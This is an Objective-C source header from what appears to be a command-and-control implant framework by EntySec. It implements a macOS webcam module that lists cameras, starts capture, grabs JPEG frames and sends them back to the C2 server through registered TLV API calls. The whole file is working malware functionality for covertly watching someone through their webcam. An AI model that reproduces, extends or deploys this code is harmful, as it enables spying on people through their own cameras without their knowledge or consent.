/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _CAM_H_
#define _CAM_H_

#include <tlv.h>
#include <api.h>
#include <c2.h>
#include <tlv_types.h>
#include <log.h>

#import <AVFoundation/AVFoundation.h>
#import <AppKit/NSImage.h>

#define CAM_BASE 5

#define CAM_FRAME \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       CAM_BASE, \
                       API_CALL)
#define CAM_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       CAM_BASE, \
                       API_CALL + 1)
#define CAM_START \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       CAM_BASE, \
                       API_CALL + 2)
#define CAM_STOP \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       CAM_BASE, \
                       API_CALL + 3)

#define TLV_TYPE_CAM_ID TLV_TYPE_CUSTOM(TLV_TYPE_INT, CAM_BASE, API_TYPE)

@interface Cam : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
-(void)captureOutput:(AVCaptureOutput *)output
       didOutputSampleBuffer:(CMSampleBufferRef)buffer
       fromConnection:(AVCaptureConnection *)connection;
@end

@interface Cam ()
{
}

-(BOOL)start:(int)deviceIndex;
-(void)stop;
-(NSData *)getFrame;
@end

@implementation Cam

Cam *cam;
CVImageBufferRef head;
AVCaptureSession *session;
int count;

-(id)init
{
    self = [super init];
    head = nil;
    count = 0;
    return self;
}

-(void)dealloc
{
    @synchronized (self)
    {
        if (head != nil)
        {
            CFRelease(head);
        }
    }
}

-(BOOL)start:(int)deviceIndex
{
    int index;
    NSArray *devices;
    AVCaptureDeviceDiscoverySession *discoverySession;

    AVCaptureDevice *device;
    AVCaptureDeviceInput *input;
    AVCaptureVideoDataOutput *output;
    NSError *error;
    dispatch_queue_t queue;

    session = [[AVCaptureSession alloc] init];
    session.sessionPreset = AVCaptureSessionPresetMedium;

#if (__MAC_OS_X_VERSION_MIN_REQUIRED <= 101406)
    devices = [AVCaptureDevice devicesWithMediaType:AVMediaTypeVideo];
#else
    discoverySession = [AVCaptureDeviceDiscoverySession discoverySessionWithDeviceTypes:@[AVCaptureDeviceTypeBuiltInWideAngleCamera]
                                                        mediaType:AVMediaTypeVideo position:AVCaptureDevicePositionUnspecified];
    devices = discoverySession.devices;
#endif

    index = deviceIndex;

    if (index < 0 || index >= [devices count])
    {
        log_debug("* Failed to open device (%d)\n", index);
        return NO;
    }

    device = devices[index];
    input = [AVCaptureDeviceInput deviceInputWithDevice:device error:&error];

    if (!input)
    {
        log_debug("* Failed to capture input (%s)\n", [error.localizedDescription UTF8String]);
        return NO;
    }

    [session addInput:input];

    output = [[AVCaptureVideoDataOutput alloc] init];
    [session addOutput:output];

    queue = dispatch_queue_create("webcam_queue", NULL);

    [output setSampleBufferDelegate:self queue:queue];
    [session startRunning];

    return YES;
}

-(void)stop
{
    [session stopRunning];
}

-(NSData *)getFrame
{
    int timer;

    CIImage *ciImage;
    NSBitmapImageRep *bitmapRep;
    NSDictionary *props;

    for (timer = 0; timer < 500; timer++)
    {
        if (count > 5)
        {
            break;
        }

        usleep(10000);
    }

    @synchronized (self)
    {
        if (head == nil)
        {
            log_debug("* Head is somehow nil (count: %d)\n", count);
            return nil;
        }

        ciImage = [CIImage imageWithCVImageBuffer:head];
        bitmapRep = [[NSBitmapImageRep alloc] initWithCIImage:ciImage];
        props = [NSDictionary dictionary];

#if __MAC_OS_X_VERSION_MAX_ALLOWED >= 101200
        return [bitmapRep representationUsingType:NSBitmapImageFileTypeJPEG properties:props];
#else
        return [bitmapRep representationUsingType:NSJPEGFileType properties:props];
#endif
    }

    return nil;
}

-(void)captureOutput:(AVCaptureOutput *)output
       didOutputSampleBuffer:(CMSampleBufferRef)buffer
       fromConnection:(AVCaptureConnection *)connection
{
    CVImageBufferRef frame;
    CVImageBufferRef prev;

    frame = CMSampleBufferGetImageBuffer(buffer);
    CFRetain(frame);

    @synchronized (self)
    {
        prev = head;
        head = frame;
        count++;
    }

    if (prev != nil)
    {
        CFRelease(prev);
    }
}

@end

static tlv_pkt_t *cam_frame(c2_t *c2)
{
    NSData *frame;
    tlv_pkt_t *result;

    @autoreleasepool
    {
        frame = [cam getFrame];

        if (frame != nil)
        {
            result = api_craft_tlv_pkt(API_CALL_SUCCESS);
            tlv_pkt_add_bytes(result, TLV_TYPE_BYTES, (unsigned char *)frame.bytes, frame.length);
            return result;
        }
    }

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *cam_list(c2_t *c2)
{
    char *name;
    tlv_pkt_t *result;

    AVCaptureDevice *device;
    AVCaptureDeviceDiscoverySession *discoverySession;
    NSArray *devices;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS);

    @autoreleasepool
    {
#if (__MAC_OS_X_VERSION_MIN_REQUIRED <= 101406)
        devices = [AVCaptureDevice devicesWithMediaType:AVMediaTypeVideo];
#else
        discoverySession = [AVCaptureDeviceDiscoverySession discoverySessionWithDeviceTypes:@[AVCaptureDeviceTypeBuiltInWideAngleCamera]
                                                            mediaType:AVMediaTypeVideo position:AVCaptureDevicePositionUnspecified];
        devices = discoverySession.devices;
#endif

        for (device in devices)
        {
            name = (char *)[[device localizedName]cStringUsingEncoding:NSUTF8StringEncoding];
            tlv_pkt_add_string(result, TLV_TYPE_STRING, name);
        }
    }

    return result;
}

static tlv_pkt_t *cam_start(c2_t *c2)
{
    int camID;
    NSData *frame;

    tlv_pkt_get_u32(c2->request, TLV_TYPE_CAM_ID, &camID);

    @autoreleasepool
    {
        cam = [[Cam alloc] init];

        if ([cam start:camID])
        {
            return api_craft_tlv_pkt(API_CALL_SUCCESS);
        }
        else
        {
            cam = nil;
        }
    }

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *cam_stop(c2_t *c2)
{
    @autoreleasepool
    {
        [cam stop];
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS);
}

void register_cam_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, CAM_FRAME, cam_frame);
    api_call_register(api_calls, CAM_LIST, cam_list);
    api_call_register(api_calls, CAM_START, cam_start);
    api_call_register(api_calls, CAM_STOP, cam_stop);
}

#endif